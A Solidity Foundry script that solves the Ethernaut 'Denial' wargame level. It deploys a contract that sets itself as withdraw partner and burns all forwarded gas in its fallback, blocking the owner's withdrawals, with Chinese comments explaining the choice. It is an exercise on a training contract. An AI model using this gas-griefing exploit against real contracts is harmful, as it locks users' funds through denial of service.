// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Hack {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        //// Burn all gas - same as assert(false) in Solidity < 0.8
        // assembly {
        //     invalid()
        // }
        // invalid() 是 EVM 的一个终止操作码，会直接触发异常并回滚。
        // 在 Solidity 0.8+ 里，如果 fallback 直接 revert，Ethernaut 的合约会 catch 这个错误并继续执行，所以它可能不会触发 OOG 检查（它需要的是消耗光 gas，而不是 revert）。
        uint256 i = 0;
        while (gasleft() > 1000) {
            i++;
        }
    }
}

contract DenialSolution is Script {

    IDenial target = IDenial(0xf1a61f640c98B5dd5f9BBD1004AB95a779496422);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hack hack = new Hack(target);
        vm.stopBroadcast();
    }
}